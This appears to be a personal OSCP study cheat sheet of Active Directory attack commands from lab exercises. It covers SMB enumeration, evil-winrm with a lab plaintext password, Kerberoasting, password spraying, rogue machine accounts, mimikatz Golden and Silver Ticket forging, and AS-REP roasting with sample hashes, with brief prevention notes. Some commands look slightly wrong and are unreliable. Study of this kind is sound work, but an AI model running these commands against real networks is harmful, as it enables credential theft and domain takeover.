# OSCP


File Management:-

	Linux:-
		
		ls -la : show hidden files & size & permissions.
		lsattr : list files attribute and if you can append even if you don't have write permission.
		chattr : change files attribute (a:append,e:can't change,I:can't delete or move,etc..).	
		ln originFile copyFile : to make hard link of originFile to copyFile
		ln -s sourceFile copyFile : to make a soft link(shortcut in windows) to sourceFile, you will find -i when you ls -la copyFile.




	Windows:-
	
		dir /(A,S,Q): display files attributes,files in directories & sub directories,files owner.
		
		
SMB Enumeration:-

	enum4linux,nmap to get domain controller + user 
	smbmap -H 10.10.11.152 -u 'guest' -d Timelapse.htb     --- to search for readable/writable shares you can use -R for recursive 
	smbclient //10.10.11.152/Shares -U Timelapse.htb/guest  --- to connect where Timelapse.htb is the domain controller and guest is the user
	
	
Password Attacks

	fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip	--- to crack zip files


General Information:-

	PFX files contains certificate and private key which can be extracted using openssl
	evil-winrm -k private.key -c public.key -i 10.10.11.152 -S   ---- to connect to winrm on port 5986 with ssl 
	example of evil-winrm to hack active directory:
			*Evil-WinRM* PS C:\users> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
			*Evil-WinRM* PS C:\users> $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
			*Evil-WinRM* PS C:\users> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
			invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
			invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime}
	

	
Active Directory Attacks:-

	Kerberoasting: Post exploitation attack, require a valid user (TGT) to request TGS from a service account with SPN and crack the TGS to get the credentials out of it (TGS is encrypted with the NTLM hash of the SPN account password).
		Tools that can be used:-
			1-Rubeus
			2-Impacket GetUserSPNs.py
			3-Powershell scripts, etc..
		Steps:-
			impacket-GetUserSPNs test.int/yazan:'yazan' -dc-ip 192.168.100.200   //serach for SPN that can help us in escilating priv.
			impacket-GetUserSPNs test.int/yazan:'yazan' -dc-ip 192.168.100.200 -request -outputfile output.hash // save the hash
			hashcat --force -m 13100 -a 0 output.hash rockyou.txt //dictionary attack to get the password 
		
		Prevention:-
			Use strong and complex password or host based password insted of user based password.
			
	Default Settings -Add-Computer
	
		Configration:-
			ms-DS-MachineAccountQuota attribute (10 by default)
			add workstation to the domain permission (enabled by default)
		Steps:-
			crackmapexec smb 192.168.200.1/30 //search for machines
			crackmapexec smb 192.168.200.1/30 -u yazan -p 'yazan' -d domain.ini //search for the domain controller 
			impacket-addcomputer -dc-ip 192.168.100.200 domain.iti/yazan:'yazan' -computer-name Computer1$ -computer-password yazan //create a computer account the name of it must containt $ at the end 
		Prevention:-
			from the configuration give it only for the needed staff.
	
	Password spraying:-
		Tools:-
			1-Metasploit- smb_login
			2-crackmapexec
		Steps:-
			impacket-GetADUsers domain.ini/yazan:'yazan' -dc-ip 192.168.100.200 > user.txt //get all users in domain
			crackmapexec smb 192.168.200.100 -u users.txt -p yazan // start the attack untill you find a user with the specified password
	Golden Ticket:-
		
		The Golden Ticket is the Kerberos authentication token for the KRBTGT account, a special hidden account with the job of encrypting all the authentication tokens for the DC. That Golden Ticket can then use a pass-the-hash technique to log into any account, allowing attackers to move around unnoticed inside the network
		
		Steps:-
			
			lsadump::dcsync /user:DOMAIN\Krbtgt
			kerberos::golden /domain:domain.com /sid:S-1-5-21-5840559-2756745051-1363507867 /aes256:ffa8bd983a5a03618bdf577c2d79a467265f140ba339b89cc0a9c1bfdb4747f5 /user:NonExistentUser /ticket:GoldenTicket.kirbi /ptt

			for more details https://www.netwrix.com/how_golden_ticket_attack_works.html
	
	Silver Ticket:-
	
		Silver Ticket only enables an attacker to forge ticket-granting service (TGS) tickets for specific services. TGS tickets are encrypted with the password hash for the service; therefore, if an adversary steals the hash for a service account, they can mint TGS tickets for that service.
		Steps:-
			PS> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit //or below
			privilege::debug //run in debug mode
			sekurlsa::logonpasswords //view passwords in memory
			kerberos::golden /user:NonExistentUser /domain:domain.com /sid:S-1-5-21-5840559-2756745051-1363507867 /rc4:8fbe632c51039f92c21bcef456b31f2b /target:FileServer1.domain.com /service:cifs /ptt
			misc::cmd
			check https://www.netwrix.com/silver_ticket_attack_forged_service_tickets.html for more details.
			
	AS-REP Roasting:-
	
		attack against Kerberos for user accounts that do not require preauthentication,During preauthentication, a user will enter their password which will be used to encrypt a timestamp and then the domain controller will attempt to decrypt it and validate that the right password was used and that it is not replaying a previous request.  From there, the TGT will be issued for the user to use for future authentication.  If preauthentication is disabled, an attacker could request authentication data for any user and the DC would return an encrypted TGT that can be brute-forced offline.  
		
		Steps:-
		
			.\Rubeus.exe asreproast  //search for users hash
			$krb5asrep$spot@offense.local:3171EA207B3A6FDAEE52BA247C20362E$56FE7DC0CABA8CB7D3A02A140C612A917DF3343C01BCDAB0B669EFA15B29B2AEBBFED2B4F3368A897B833A6B95D5C2F1C2477121C8F5E005AA2A588C5AE72AADFCBF1AEDD8B7AC2F2E94E94CB101E27A2E9906E8646919815D90B4186367B6D5072AB9EDD0D7B85519FBE33997B3D3B378340E3F64CAA92595523B0AD8DC8E0ABE69DDA178D8BA487D3632A52BE7FF4E786F4C271172797DCBBDED86020405B014278D5556D8382A655A6DB1787DBE949B412756C43841C601CE5F21A36A0536CFED53C913C3620062FDF5B18259EA35DE2B90C403FBADD185C0F54B8D0249972903CA8FF5951A866FC70379B9DA // user hash found
			$krb5asrep$23$spot@offense.local:3171ea207b3a6fdaee52ba247c20362e$56fe7dc0caba8cb7d3a02a140c612a917df3343c01bcdab0b669efa15b29b2aebbfed2b4f3368a897b833a6b95d5c2f1c2477121c8f5e005aa2a588c5ae72aadfcbf1aedd8b7ac2f2e94e94cb101e27a2e9906e8646919815d90b4186367b6d5072ab9edd0d7b85519fbe33997b3d3b378340e3f64caa92595523b0ad8dc8e0abe69dda178d8ba487d3632a52be7ff4e786f4c271172797dcbbded86020405b014278d5556d8382a655a6db1787dbe949b412756c43841c601ce5f21a36a0536cfed53c913c3620062fdf5b18259ea35de2b90c403fbadd185c0f54b8d0249972903ca8ff5951a866fc70379b9da //insert 23 after the $krb5asrep$
			hashcat -m18200 '$krb5asrep$23$spot@offense.local:3171EA207B3A6FDAEE52BA247C20362E$56FE7DC0CABA8CB7D3A02A140C612A917DF3343C01BCDAB0B669EFA15B29B2AEBBFED2B4F3368A897B833A6B95D5C2F1C2477121C8F5E005AA2A588C5AE72AADFCBF1AEDD8B7AC2F2E94E94CB101E27A2E9906E8646919815D90B4186367B6D5072AB9EDD0D7B85519FBE33997B3D3B378340E3F64CAA92595523B0AD8DC8E0ABE69DDA178D8BA487D3632A52BE7FF4E786F4C271172797DCBBDED86020405B014278D5556D8382A655A6DB1787DBE949B412756C43841C601CE5F21A36A0536CFED53C913C3620062FDF5B18259EA35DE2B90C403FBADD185C0F54B8D0249972903CA8FF5951A866FC70379B9DA' -a 3 /usr/share/wordlists/rockyou.txt
			

			
![image](https://user-images.githubusercontent.com/91881471/174433005-d10ed507-c66c-4760-9eff-4a1c9099ee7e.png)


	Requesting RC4 Encrypted Ticket:-
	
		As mentioned in the beginning, it's still possible to request an RC4 ecnrypted ticket (if RC4 is not disabled in the environment, which does not seem to be common yet):
		
		Steps:-
			F:\Rubeus\Rubeus.exe kerberoast /tgtdeleg
			then crack it
